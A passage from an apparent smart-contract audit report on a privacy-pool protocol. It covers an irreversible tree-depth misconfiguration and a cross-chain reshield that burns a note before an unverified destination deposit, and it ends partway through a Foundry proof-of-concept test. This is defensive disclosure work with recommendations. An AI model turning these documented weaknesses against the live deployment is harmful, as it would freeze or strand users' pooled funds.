These two setters also sit apart from the rest of the admin surface. `PoolVault.setAspRegistry`, `setKeystore`, `setRagequitVerifier`, `setDepositVerifier` and `TransactVerifierRouter._setVerifier` are plain overwrites, each undone by calling it again with the right value; the tree-size setters are the only members of that surface whose effect cannot be walked back by the setter itself, because it lands in the tree rather than in the slot they write. And the documented recovery architecture assumes an independence the circuits do not have. In the repository's circuits failure-mode register, `circuits-failure-modes-and-recovery.md`, the FM13 row covering keystore Merkle tree manipulation prescribes "Affected users ragequit and re-register", and the FM15 row covering an over-constrained circuit lists "Ragequit as fallback if Transact fails unexpectedly". Both rest on `ragequit` being independent of `transact`. It is not: `Ragequit(18)` and `Transact(..., 18, 18)` share one `keystoreMaxDepth`, so a keystore cap raise takes out the primary path and its documented fallback in the same block.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L138-L144
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L289-L295
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits/templates/Ragequit.circom#L65-L71
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/interfaces/IKeystore.sol#L171-L177
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/helpers/DeploymentVerifier.sol#L104-L110
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/test/unit/Keystore.t.sol#L662-L680

#### Impact

With the keystore at depth 19, both spend paths close at once. `PoolVault._validateAndVerify` gates `transact` on `$.keystore.isKnownRoot(_proof.keyRegistryRoot())` and `PoolVault.ragequit` gates on the same call; the only current root is the depth-19 one, and no deployed circuit can produce a witness for it. `Keystore.isKnownRoot` accepts a superseded root only while `block.timestamp < $.previousRoots[_root]`, stamped with `keystoreRootLiveness`, which every `ChainConfigRegistry` row sets to 1200 seconds, so twenty minutes after the fatal insert every note in that pool is unspendable and unexitable at once: all of the chain's pooled deposits, all users. That contradicts a promise the protocol states without conditions. The overview's "Guaranteed Fund Safety" item reads: "A ragequit failsafe mechanism ensures user's funds can never be frozen, by allowing them to exit the pool at any moment." The Ragequit template's header comment says the circuit "intentionally bypasses ASP compliance checks and forces a public withdrawal to the note's owner address, ensuring user funds can never be permanently frozen." Neither statement is qualified on operator configuration.

The state-tree branch is narrower. A state tree at depth 23 makes every `transact` unprovable against `stateDepthCheck`, so private transfers and private withdrawals stop permanently. `ragequit` survives it, because the `Ragequit` template proves no state-tree membership and `PoolVault.ragequit` reaches the note through the `commitments` mapping via `_commitmentExists` rather than reading the tree; it still inserts a nullifier leaf and so still has to clear its own `PoolVault_StateTreeFull` check, which a freshly raised cap supplies. The money stays publicly exitable; the private side of the protocol does not.

"Irreversible" is the wrong word for either branch, and two recovery routes bound the damage. Tree depth is a private signal in every compiled circuit: the `component main` declarations of the 25 transact mains publish `[stateRoot, keystoreRoot, associationSetRoot, amountOut, tokenIdOut, context]` and the ragequit main publishes `[keystoreRoot, ownerAddress, value, tokenId, label]`, with no depth in either list, so circuits recompiled at a greater `keystoreMaxDepth` are a drop-in against the public-signal layout `TransactVerifierRouter` fixes with `_FIXED_PUBSIGNALS = 6`. Installing them is 25 `TransactVerifierRouter.setVerifier` calls plus one `PoolVault.setRagequitVerifier`, and leaves, commitments, nullifiers and roots survive in ERC-7201 namespaced storage that a verifier swap does not touch, so no user re-registers and no note is lost. What it costs is a fresh Groth16 setup for each of the 26 circuits, a ceremony rather than a deploy, performed by `UPGRADER_ROLE`, the trusted party `ragequit` exists to route around, and finished long after the 1200-second window closes. The tree never goes back: the fix moves the circuit to the tree, never the tree to the circuit.

The cheaper route is a storage rollback. The fatal insert lands at index `262_144 = 1 << 18`, so the `sideNodes` loop in `InternalLeanIMT._insert` leaves the pre-fatal depth-18 root untouched in `sideNodes[18]` and puts the new root in `sideNodes[19]`, while `sideNodes[0..17]` are recomputable off-chain from the leaf sequence `_setAuthPolicy` emits through `LeafInserted(_authLeaf, _root, _index)`. Both contracts are UUPS with `_authorizeUpgrade` gated on `UPGRADER_ROLE`, so an implementation restoring `depth`, `size`, `sideNodes` and `currentRoot` returns provability to all 262,144 pre-existing leaves with no recompile, no new trusted setup and no user re-proof. That route was derived from the storage layout and the insert loop; no such upgrade was written or executed. One qualifier stays open on the same footing: that a depth-19 root is unprovable under the shipped depth-18 verifying key rests on `Ragequit` declaring `signal input keystoreSiblings[maxDepth]` with `maxDepth = 18` and on its `keystoreDepthCheck` constraining `keystoreTreeDepth <= 18`. No witness was generated and no proof was verified.

#### Recommendation

We recommend bounding both setters against the compiled circuit rather than against prose. Store the compiled ceilings (`1 << keystoreMaxDepth` and `1 << stateMaxDepth`) in the same storage the verifier set lives in, add `require(_maxKeystoreTreeSize <= _keystoreDepthCeiling, ...)` to `setMaxKeystoreTreeSize` and `require(_maxStateTreeSize <= _stateDepthCeiling, ...)` to `setMaxStateTreeSize`, apply the same bound in `Keystore.initialize` and `PoolVault.initialize`, and make each ceiling writable only in the transaction that registers a deeper verifier set, so the cap and the circuits cannot separate. A hardcoded `require(_maxKeystoreTreeSize <= 1 << 18)` is not enough on its own: the deployed cap already equals `1 << 18` in all four configs, so it changes nothing on day one, and it also forecloses the coordinated depth bump that is one of the two ways out of a saturated keystore. The bound has to track the circuit that is actually deployed, which is why the ceiling belongs in storage next to the verifier set rather than in a constant. The pattern already exists in this codebase: `PrivacyPoolRelay`, the batching relay contract, enforces its own cross-contract consistency at deploy time in its constructor with `require(_MAX_BATCH < _pool.rootHistorySize(), PrivacyPoolRelay_RootHistoryTooSmall())`, refusing to deploy against a pool whose root buffer is too small for a full batch. All of this sits on this repository's own side of the dependency boundary, which matters, because the depth ratchet that makes the misconfiguration unrecoverable lives in `@zk-kit/lean-imt.sol` and cannot be patched in place, only bumped or forked. We also recommend compiling headroom into the keystore so a saturation event becomes a parameter bump instead of an emergency: build `Ragequit` and the 25 transact mains at a `keystoreMaxDepth` above 18 while leaving `maxKeystoreTreeSize` at `262_144`, which costs a small number of constraints per level and gives the operator a value that is safe to move to. Before acting on the recovery routes above, generate a witness over a 262,145-leaf keystore tree against the shipped depth-18 verifying key and confirm it does not verify.

We also recommend three supporting changes. Change the `maxKeystoreTreeSize` upper-bound `require` in `DeploymentVerifier.validateSystemConfig` to use a keystore constant instead of `LIKELY_MAX_STATE_TREE_SIZE`, and add the matching over-large-keystore-cap case to the `DeploymentVerifier` unit tests. Change the `bound` call in `test_SetMaxKeystoreTreeSize_WhenNewMaxSizeIsGreaterThanCurrentTreeSize` so the suite stops asserting that `type(uint256).max` is an acceptable cap, and add a case covering the range that should now revert. And amend the NatSpec on `setMaxKeystoreTreeSize` and `setMaxStateTreeSize` to say that the step cannot be undone with a second call to the same setter and that on the keystore it also disables `ragequit`, mirror that in the "Guaranteed Fund Safety" item of the protocol overview, and correct the FM13 and FM15 rows of the circuits failure-mode register so neither names `ragequit` as an independent fallback for a transact failure while both circuits share `keystoreMaxDepth`. Separately, the `@param maxDepth` doc line on the `Ragequit` template still reads "14 for ~16k keystore entries" against the `Ragequit(18)` that is actually compiled.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #016 — The cross-chain reshield burns the nullifier before a destination deposit nothing on-chain verifies

**Severity:** Medium · **Location:** `packages/contracts/src/contracts/PoolVault.sol` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** PERM · **Kill chain:** KC-01 · **Status:** Open

#### Description

A cross-chain reshield burns a user's note on one chain, bridges the money, and redeposits it as a new note on another. The holder has no wallet on the destination chain to sign that second deposit, so it is built beforehand: the holder takes a route quote from LiFi, the bridge aggregator this package routes through, whose final step is a call to the destination chain's `Entrypoint.deposit`, proves against that quote, and hands the signed package to a relayer, which submits the source-chain transaction for a relay fee. The source chain does all of its work in one transaction; the deposit runs minutes later, in a separate transaction on a separate chain, executed by the bridge.

The burn is not conditional on the redeposit. A nullifier is the one-time identifier the pool records when a note is spent, and that record is one-way, with no path in the contracts that clears it. If the destination deposit fails, the holder has nothing: the note on the source chain is burned, no note exists on the destination, and the bridged money sits at a fallback address that the SDK defaults to the relayer's own. When the deposit succeeds, whatever the bridge delivered above what the deposit cost is left over, and it goes to that same address. The design accepts this and names the remedy, saying the relayer "receives anything not redeposited and is expected to later turn it into a deposit on the user's behalf". That is what the dust-rescue service is for, so this path is the holder's recovery.

**Where it breaks.** Nothing verifies the second half, and the remedy for what it leaves behind never fires. Two things that should meet do not:

- the source chain burns the note on the premise that the destination deposit will mint one, and no code in this repository, on either chain, ever confirms that it did; the holder's own client reports the reshield complete once the source transaction confirms.
- the rescue service returns a leftover only once it is worth at least a flat two dollars, while every leftover the protocol has been recorded producing is between about three cents and about forty-seven cents, and the state it files those in is terminal and never revisited.

So the money stops being the holder's either way: on a failed deposit the whole principal, and on every successful one the remainder, which at the measured rates needs a withdrawal of roughly $420 to $610 before the rescue service treats it as worth returning at all.

In `PoolVault`, `transact` verifies the spend proof and then writes `$.spentNullifiers[_nullifierHash] = block.timestamp` inside its nullifier loop, immediately after the `_nullifierSpent` double-spend check. From then on any proof reusing that note reverts with `PoolVault_NullifierAlreadySpent`. That write is the only record that the note is gone, and it is one-way: `spentNullifiers` is assigned in exactly two places, `transact` and `ragequit`, both storing `block.timestamp`, and read in `_nullifierSpent` and the public getter. `PoolVault.sol` contains no `delete` statement, and nothing under `packages/contracts/src/` assigns zero to that mapping. A restore path, an admin reset, or a timestamp rollback would have falsified this; none exists.

The relayer cannot alter the signed package, because `RelaySwaps.execute` decodes a `SwapRouting` struct committed inside the spend proof's context hash, so changing any byte, including the LiFi calldata, invalidates the proof.

The relayer's transaction does all of the source-chain work in one `RelaySwaps.execute` call and ends. The rest happens minutes later, in a separate transaction on the destination chain dispatched by the LayerZero cross-chain messaging layer and executed by LiFi's destination receiver:

```text
SOURCE CHAIN, one atomic transaction         DESTINATION CHAIN, a separate transaction later
  h1  PoolVault.transact                     h5  LiFi receiver, lzCompose
        verifies the spend proof                   runs the compose payload the route baked in
        BURNS the nullifier                        h5a  Entrypoint.deposit(proof, noteData, ...)
        pays amountOut to RelaySwaps                    pulls noteValue + vettingFee
  h2  relay fee paid to feeRecipient               h5b  PoolVault.deposit -> the new note exists
  h3  gas swap: input token -> ETH                 h5f  on failure: the raw bridged tokens are
        funds the bridge's msg.value                    sent to the payload's fallback receiver
        (only on routes needing a native fee)
  h4  swapTarget.call(swapCalldata)
        value leaves the source chain  ------------------>
  h6  delta-only dust sweep to dustRecipient
        source-chain residue only
```

`totalDepositCost` is what the destination deposit must be able to pay: `Entrypoint.deposit` computes a vetting fee from the note value and pulls `_value + _fee` from its caller with `safeTransferFrom`, so the executor needs the full sum or the call reverts. The leftover is whatever the bridge delivered above `totalDepositCost`; LiFi's executor pays the deposit and sends that leftover to the route's `toFallbackAddress`, and on a failure it sends everything there. `SwapRouting` carries a `fallbackAddress` field mirroring `toFallbackAddress`, which the SDK defaults to the relayer. The atomicity that protects every other flow in this codebase, all hops in one transaction so a revert unwinds the burn, stops applying at h4. The nullifier is burned at h1; h5a and h5b commit in a different transaction on a different chain, and nothing in h1 through h6 observes whether they committed.

That ordering is documented nowhere. `docs/tech-design/sdk/withdraw-and-swap.md` records that `routing.fallbackAddress` maps to LiFi's `toFallbackAddress` and that the field "is never read on-chain (proof-binding + SDK assertion only)", but it uses the word "nullifier" once in the whole file, and its Cross-Chain Failure Taxonomy enumerates three failure legs, Leg 0 source transaction, Leg 1 bridge in flight and Leg 2 destination, naming the nullifier in none of them. Its Leg 1 row tracks the money rather than the note, recording funds "currently stuck" at the depositor, which is the `RelaySwaps` contract, with "no rescue path" and an admin sweep "planned in a separate PR". Every description of the nullifier mechanism elsewhere under `docs/tech-design/` is a same-transaction double-spend guard: the `spentNullifiers` bullet in `overview.md`, the `PoolVault` state table in `contracts-tech-design.md`, the worked sample in `timestamp-implementation.md`. `agents/deviations.md`, the register of accepted design deviations, contains no occurrence of `fallbackAddress`, and no statement of the ordering appears in that register, anywhere under `docs/tech-design/`, or in the `RelaySwaps` or `PoolVault` NatSpec. A design-choice row, a taxonomy cell or a code comment saying the note is already spent when Leg 1 or Leg 2 fires would have falsified this. There is none.

The destination remainder is measured, recurring, and the rescue built for it cannot reach it. `packages/swaps/scripts/dust-leftover-observer.ts` measures how much destination-chain leftover shows up at `fallbackAddress` and how long it takes to land, and every run of it executes a real deposit and a real cross-chain reshield, with real gas, bridge fees and slippage. Five `dust-leftover-observer-*.json` results are committed under `packages/swaps/scripts/results/`. Two record a LiFi HTTP 404 ("Unable to find quote to match expected output") with no transaction hashes and an empty `balanceSeries`; three completed. All five are on the same corridor, `sourceChainId` 42161 (Arbitrum One) to `destChainId` 8453 (Base), USDC to USDC, and each completed run records a `sourceTxHash` and a `destinationTxHash`.

| result file | date | withdrawal | `noteValueHuman` | `leftoverFinalHuman` | `leftoverAsFractionOfAmount` |
| --- | --- | --- | --- | --- | --- |
| `dust-leftover-observer-1786748695358-run1.json` | 2026-08-14 | 10 USDC | 9.716467 | 0.032917 | 0.0032917 (0.329%) |
| `dust-leftover-observer-1786749614080-run1.json` | 2026-08-14 | 100 USDC | 97.717235 | 0.474573 | 0.00474573 (0.475%) |
| `dust-leftover-observer-1787026324529-run1.json` | 2026-08-18 | 10 USDC | 9.716207 | 0.032919 | 0.0032919 (0.329%) |

Each file carries `"fallbackAddress": "0xa60748B7E7BBdE1D97b5c258f1b317E748E6FccF"`, the relayer's own address, so the leftover is an ERC-20 balance increase at the relayer on the destination chain, time-correlated with the reshield. Each `methodologyNote` states the measurement's caveat: the leftover is a balance delta at that address before and after the run, and near-zero concurrent cross-chain-reshield traffic there during the run window was assumed rather than verified. Whether the value comes back is recorded too. Each `balanceSeries` holds ten samples taken after the bridge reported done, at `tSecSinceDone` 0 through 279 or 294, roughly five minutes, and in all three runs every sample is identical to the last decimal. Whether the three rates are representative is unresolved: the repository's own captured LiFi route fixture implies a leftover an order of magnitude larger than the 0.33% to 0.48% they record, and re-running the observer across more corridors, more sizes and a cross-asset pair would settle it.

Neither ceiling the codebase applies to this flow covers that remainder. `RelaySwaps.execute` checks `_r.feeAmount` against `ENTRYPOINT.assets(_token).maxRelayFee`, which bounds the relay fee and nothing else. `assertLifiBudget` in the SDK measures `netSwapAmount - lifiFrom` against `SWAP_DUST_TOLERANCE_BPS`, which is 300 basis points, and that constant's docstring scopes it to the source-chain swap input dust, `net − lifiFromAmount`, "swept to `dustRecipient`". A term covering a destination-chain balance in either check would have falsified this; neither has one.

The mechanism the design leans on instead is a stealth dust rescue. The `fallbackAddress` doc comment on `EstimateReshieldCrosschainParams` calls the relayer default a "transient design: the relayer receives anything not redeposited and is expected to later turn it into a deposit on the user's behalf". That rescue is a standalone service, `packages/relayer/dust-rescue-service`, which detects a destination leftover, proves a deposit for it to a fresh stealth address, and submits it. Whether a given leftover gets that treatment is decided in `SweepService.handleAwaitingDestination`:

```ts
// dust-rescue-service, SweepService.handleAwaitingDestination
const usdMicros = sweptAmountUsdMicros(result.sweptAmount, job.usdRate);
const minWorthUsdMicros = this.config.minWorthUsdMicros(job.destinationChainId);
...
if (usdMicros < minWorthUsdMicros) {
    await this.jobStore.update(job.sourceTxHash, { state: "BELOW_THRESHOLD", ...common });
    return;
}
```

`BELOW_THRESHOLD` is terminal. It is one of the three states in `TERMINAL_STATES` in `job.types.ts`, and `FirestoreJobStoreService`'s pending-jobs query selects with `.where("state", "not-in", TERMINAL_STATES)`, so a job that lands there is never picked up again; `SweepService.advance`'s state switch has no case for it either, and falls through to `default: return`. A retry path, a second pass at a lower threshold, or an accumulator that adds leftovers across runs would have falsified this; the service has none of the three.

The threshold is a flat placeholder. `minWorthUsdMicros` is set to `2000000` micro-USD, which is $2, in `dust-rescue-service.config.example.json` for every chain, and the service README's config table records it as "a flat `2000000` ($2) on every chain as a deliberate v1 placeholder (decided 2026-08-18)". USDC is a dollar stablecoin, so the leftover in USDC is the leftover in dollars to within rounding, and `sweptAmountUsdMicros` scales it to micro-USD:

| run | leftover | in micro-USD | floor | outcome |
| --- | --- | --- | --- | --- |
| 10 USDC, 2026-08-14 | 0.032917 USDC | 32,917 | 2,000,000 | `BELOW_THRESHOLD`, 60.8x short |
| 100 USDC, 2026-08-14 | 0.474573 USDC | 474,573 | 2,000,000 | `BELOW_THRESHOLD`, 4.2x short |
| 10 USDC, 2026-08-18 | 0.032919 USDC | 32,919 | 2,000,000 | `BELOW_THRESHOLD`, 60.8x short |

Read the other way, at the higher observed rate of 0.475% the break-even is `$2 / 0.00474573 = $421.43`, and at the lower rate of 0.329% it is `$2 / 0.0032917 = $607.59`. On these corridors a withdrawal has to be somewhere between about $420 and about $610 before its leftover is worth rescuing at all, and every leftover this protocol has been recorded producing sits far below that. Nothing gates the small reshield out either: all thirteen production entries in `ChainAssetRegistry` ship `minAmount: 1`, one base unit, and a privacy pool encourages small uniform notes, because uniformity is what makes an anonymity set. The exclusion is a property of the threshold rather than of the deployment, so it holds whether or not the service runs; `agents/deviations.md` records the service as "Not yet deployed to a live GCP project", built and unit-tested only.

The terminal hop is observable, and enforced nowhere. `RelaySwaps.execute` identifies the reshield mode by `recipient == address(0)` and in that mode rejects a non-zero `minOutputAmount`, so the step-11 balance-delta guard, which compares the recipient's balance before and after the swap, runs only when `recipient` is set and `minOutputAmount > 0` and is unreachable here by construction; the `F-960` rule that a real recipient must arm that guard is itself conditioned on `recipient != address(0)` and exempts this path. The `SwapRouting` NatSpec records the reasoning: in that mode "output delivery is verified elsewhere (Entrypoint.deposit revert / LiFi destination executor)". For the cross-chain leg, no code in this repository performs that verification. The SDK's own comment above the destination-affordability check in `prepareReshieldCrosschainQuote` states the consequence: a deposit costing more than what arrives "can NEVER succeed on arrival ... the executor's call fails, LiFi catches it, and the RAW bridged tokens go to the fallback address instead of a shielded note".

The gap is in enforcement rather than observability, because the machinery to observe it already ships. `LiFiSwapQuoteProvider.getSwapStatus` queries LiFi for the state of a cross-chain transfer and is re-exported to end users through `PoolSession.getSwapStatus`, and the relayer's own `DetectionService.checkLeg` uses it: it polls until the status leaves `PENDING`, reads `status.receiving.amount`, then fetches the destination transaction receipt over RPC and treats a non-success receipt as a failure. `PoolSessionReshieldCrosschain` does none of that. It contains no occurrence of `getSwapStatus`, `swapProvider`, `destinationTxHash` or any poll, and its only wait is the `waitForTransactionReceipt` call on the source chain inside `relayReshieldCrosschain`, whose source-chain `TxReceipt` it returns as the operation's result. A user who reshields across chains is told the operation succeeded when the source transaction confirms.

The same asymmetry runs through the pre-proof check. LiFi's Diamond exposes a `CalldataVerificationFacet` that decodes a route's own calldata and returns its parameters, including the receiver, and `assertRecipientIsEmbeddedInQuote` in `PoolSessionWithdrawAndSwap` calls it through `extractMainParameters`, throwing `LiFiRecipientNotFound` unless the receiver it decodes equals the caller's `recipientAddress`. Its docstring explains that for cross-chain paths "there is no on-chain backstop ... this is the only pre-proof defense". `PoolSessionReshieldCrosschain` never calls it: `CALLDATA_VERIFICATION` and `extractMainParameters` appear only in `LiFiSwapQuoteProvider.ts`, where the two ABI fragments are declared, and in `PoolSessionWithdrawAndSwap.ts`, where they are used. An import or call in the reshield session would have falsified this; there is none. What the reshield session checks instead is `assertReshieldCrosschainRouting`'s comparison of `routing.fallbackAddress` against `expected.fallbackAddress`, which compares the struct field the contract never reads against the SDK's own computed value. The receiver that governs where the money actually goes sits inside `swapCalldata` and is never looked at on this path.

No attacker is required, and none is available. The LiFi calldata is produced client-side from `lifiQuote.transactionData` in `prepareReshieldCrosschainQuote`, byte-compared against the relayer's echo by `assertSwapCalldataMatches`, and committed inside the spend proof's context hash, so a relayer can neither substitute it nor manufacture a delivery shortfall. It receives the remainder passively, because `effectiveFallbackAddress` in both `estimateReshieldCrosschainAmount` and `prepareReshieldCrosschainQuote` resolves `fallbackAddress ?? relayerInfo.address`.

The flow is reachable on a live, funded pool today. `RelaySwaps` is deployed on Ethereum mainnet and Optimism, which `deployments-it-003.json` describes as production infrastructure, and on Arbitrum and Base as staging. All four accept the cross-chain reshield shape: the two guards that exist only for it, `RelaySwaps_NativeGasWithoutRecipient` and `RelaySwaps_MinOutputWithoutRecipient`, which fire only when `recipient` is the zero address as a reshield carries, are present in the deployed bytecode of all four, and `approvedRouters` returns true for the LiFi Diamond on all four, against a control address that returns false. The mainnet `PoolVault` behind those instances holds user funds.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L170-L175
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L293-L299
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L261-L263
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/scripts/results/dust-leftover-observer-1787026324529-run1.json#L62-L77
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/relayer/dust-rescue-service/src/sweep/sweep.service.ts#L65-L79
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionWithdrawAndSwap.ts#L496-L522

#### Impact

The first effect is certain and priced in basis points. On the three completed observer runs the withdrawal lost 32.9, 47.5 and 32.9 bps of its amount to a public ERC-20 transfer at the relayer's address on the destination chain. Measured against the note the user actually received, `noteValueHuman`, the same three are 33.9, 48.6 and 33.9 bps. For scale against a charge the user does see, the 2026-08-18 run records a `relayerFeeAmountHuman` of 0.059079 USDC against a leftover of 0.032919, so the unbilled remainder came to 56% of the relay fee on that reshield. The relay fee is capped on-chain by `maxRelayFee`, quoted to the caller before signing, and re-checked against the relayer's signed commitment. The remainder is none of those things.

The second effect is the total loss of a withdrawal. If the delivered amount lands below `totalDepositCost`, the destination deposit cannot be paid, because `Entrypoint.deposit` pulls note value plus vetting fee in one `safeTransferFrom`. No code in this repository returns that value to the shielded set or to the user: the only destination-side recipient named anywhere in the compose payload is the fallback receiver, and the source nullifier is already burned with no un-burn path, so the note is gone and its owner has no on-chain claim of any kind. The source-chain analogue at least has an exit, `RelaySwaps.rescue`, but it is `onlyOwner` and the owner has no way to attribute a stranded balance to an anonymous note owner, which is the whole point of the flow.

#### Proof of concept

The source-chain half is executed. The accompanying Foundry test, `burn-ordering.t.sol`, drops into `packages/contracts/test/unit/` and runs with `forge test --match-path test/unit/burn-ordering.t.sol`; its five tests pass at this commit. It drives the real `PoolVault` with a stand-in processor. `PoolVault` pays the withdrawal to `msg.sender` from inside `transact`, via `_transferAsset`, so the processor's `receive()` fires at the earliest instant it can hold the value and strictly before it could dispatch anything to a bridge. From inside `receive()` the test reads `POOL.spentNullifiers(nh)`, which is an external view and therefore reachable mid-call. It runs 5 of 5 under forge 1.3.2, with no fork and no RPC. It was re-executed by copying it into `packages/contracts/test/unit/`, running it, and deleting it, so the tree is left byte-unchanged:

```text
[PASS] test_C2_MutationControl_FreshNullifierStillSpendable() (gas: 1499691)
[PASS] test_T1_NullifierBurnedBeforeBridgeDispatch()          (gas:  860240)
[PASS] test_T2_NoteUnspendableAfterBurn()                     (gas: 1351304)
[PASS] test_T3_BurnSurvivesFailedReplay()                     (gas: 1353013)
[PASS] test_T4_VaultKeepsNoDestinationPostcondition()         (gas:  854383)
```

T1 observes `spentNullifiers[nh] == block.timestamp` at the instant the value reaches the processor. Three in-test controls fired: an unrelated nullifier read at the same instant returns 0, so the harness is not returning non-zero for everything; the watched nullifier reads 0 before `transact`, fixing the ordering; and a fresh nullifier still spends after the first is burned, so the T2 revert is caused by the burn rather than by an unrelated invariant. T3 warps seven days forward, which is the "bridge never delivers" window, replays, and finds the mapping unchanged. A deliberate source mutation asserting `observedWatchedAt == 0` fails the suite, so T1 cannot pass vacuously.

The test spends a native-asset note, because the processor's `receive()` is what makes the mid-call read possible at all. The nullifier write precedes `_transferAsset` in `transact` on either asset branch, so the ordering it establishes is not particular to the asset.

`burn-ordering.t.sol` drives the real `PoolVault` through the repository's own `PoolVaultHarness` with a `BridgeObserverProcessor` standing in for `RelaySwaps`, reading the nullifier mapping from inside the withdrawal payment:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.32;

// Proof of concept. Not part of the repository's own test suite.
//
// LEG 1 UNDER TEST: "the cross-chain reshield burns the nullifier at hop 1".
//
// Executed against the REAL `PoolVault` implementation (via the repository's own
// `PoolVaultHarness`, which only spies on the verifier and the tree — the
// `transact` body, the `spentNullifiers` write and the `_transferAsset` call
// are the shipped code at 638bf8f4).
//
// The processor is a `BridgeObserverProcessor` standing in for `RelaySwaps`.
// `PoolVault._transferAsset` (src/contracts/PoolVault.sol:401-407) pays the
// withdrawal to `msg.sender`, i.e. the processor, from INSIDE `transact`, at
// PoolVault.sol:186 — strictly after the nullifier write at PoolVault.sol:173.
// So the observer's `receive()` runs at the earliest instant the processor can
// possibly hold the value, which is strictly BEFORE the processor's own
// bridge dispatch (RelaySwaps.sol:379). If the nullifier already reads as
// spent at that instant, the burn provably precedes any bridge dispatch.
//
// CONTROLS
//  C1 anti-vacuity: the same `receive()` reads an *unrelated* nullifier and
//     must see 0. A harness that returned nonzero for everything fails here.
//  C2 mutation: a fresh, never-spent nullifier replays fine, proving the
//     replay revert in T2 is caused by the burn and not by an unrelated
//     invariant.
//  C3 negative-ordering control: before `transact`, the watched nullifier
//     reads 0.

import {IAccessControl} from '@openzeppelin/contracts/access/IAccessControl.sol';
import {ERC1967Proxy} from '@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol';

import {IASPRegistry} from 'interfaces/IASPRegistry.sol';
import {IKeystore} from 'interfaces/IKeystore.sol';
import {IPoolVault} from 'interfaces/IPoolVault.sol';
import {IRootBuffer} from 'interfaces/IRootBuffer.sol';
import {ITransactVerifierRouter} from 'interfaces/ITransactVerifierRouter.sol';
import {SNARK_SCALAR_FIELD} from 'lean-imt/Constants.sol';
import {ProofLibV2} from 'libraries/ProofLibV2.sol';
import {PoolVaultHarness} from 'test/unit/helpers/PoolVaultHarness.sol';
import {buildMockTransactProofDynamic} from 'test/unit/helpers/ProofUtils.sol';
import {TestUtils} from 'test/unit/helpers/TestUtils.sol';
import {Constants} from 'utils/Constants.sol';
import {Groth16Verifier as DepositGroth16Verifier} from 'verifiers/deposit/groth16_verifier.sol';
import {Groth16Verifier as RagequitGroth16Verifier} from 'verifiers/ragequit/groth16_verifier.sol';

interface IVaultView {
  function spentNullifiers(uint256 _nullifierHash) external view returns (uint256 _spentAt);
  function transact(
    ProofLibV2.TransactProof calldata _proof,
    IPoolVault.TransactParams calldata _transactParams,
    IPoolVault.NoteData[] calldata _noteData
  ) external;
}

/// @notice Stand-in for `RelaySwaps`: it is the `processor`, it receives the
///  withdrawal inside `transact`, and only afterwards would it dispatch to the
///  bridge (`RelaySwaps.sol:379`).
contract BridgeObserverProcessor {
  IVaultView public vault;
  uint256 public watched;
  uint256 public control;

  uint256 public observedWatchedAt; // spentNullifiers(watched) as seen mid-transact
  uint256 public observedControlAt; // spentNullifiers(control) as seen mid-transact
  bool public observed;
  uint256 public receivedValue;

  bool public bridgeDispatched;
  uint256 public watchedAtDispatch;

  function configure(address _vault, uint256 _watched, uint256 _control) external {
    vault = IVaultView(_vault);
    watched = _watched;
    control = _control;
  }

  receive() external payable {
    observedWatchedAt = vault.spentNullifiers(watched);
    observedControlAt = vault.spentNullifiers(control);
    receivedValue = msg.value;
    observed = true;
  }

  /// @notice Mirrors RelaySwaps.execute steps 8 -> 10: transact, then dispatch.
  function runReshieldLeg(
    ProofLibV2.TransactProof calldata _proof,
    IPoolVault.TransactParams calldata _params,
    IPoolVault.NoteData[] calldata _noteData
  ) external {
    vault.transact(_proof, _params, _noteData); // step 8  (RelaySwaps.sol:328)
    watchedAtDispatch = vault.spentNullifiers(watched);
    bridgeDispatched = true; // step 10 (RelaySwaps.sol:379) — value leaves the chain
  }
}

contract BurnOrderingPoC is TestUtils {
  uint256 internal constant MAX_STATE_TREE_SIZE = 1 << 22;
  uint32 internal constant ROOT_HISTORY_SIZE = 30;

  PoolVaultHarness internal poolVault;
  BridgeObserverProcessor internal processor;

  RagequitGroth16Verifier public mockRagequitVerifier = RagequitGroth16Verifier(makeAddr('mockRagequitVerifier'));
  DepositGroth16Verifier public mockDepositVerifier = DepositGroth16Verifier(makeAddr('mockDepositVerifier'));

  uint256 internal constant STATE_ROOT = 111;
  uint256 internal constant KEY_ROOT = 222;
  uint256 internal constant ASP_ROOT = 333;
  uint256 internal constant NEW_ROOT = 444;
  uint256 internal constant AMOUNT_OUT = 5 ether;

  uint256 internal constant NULLIFIER = 0xBEEF01;
  uint256 internal constant CONTROL_NULLIFIER = 0xC0FFEE; // never spent
  uint256 internal constant FRESH_NULLIFIER = 0xFEED02; // C2 mutation control
  uint256 internal constant COMMITMENT = 0xABCD01;
  uint256 internal constant COMMITMENT_2 = 0xABCD02;

  function setUp() external {
    PoolVaultHarness implementation = new PoolVaultHarness(IAccessControl(mockAccessRouter));
    ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), '');
    poolVault = PoolVaultHarness(payable(address(proxy)));
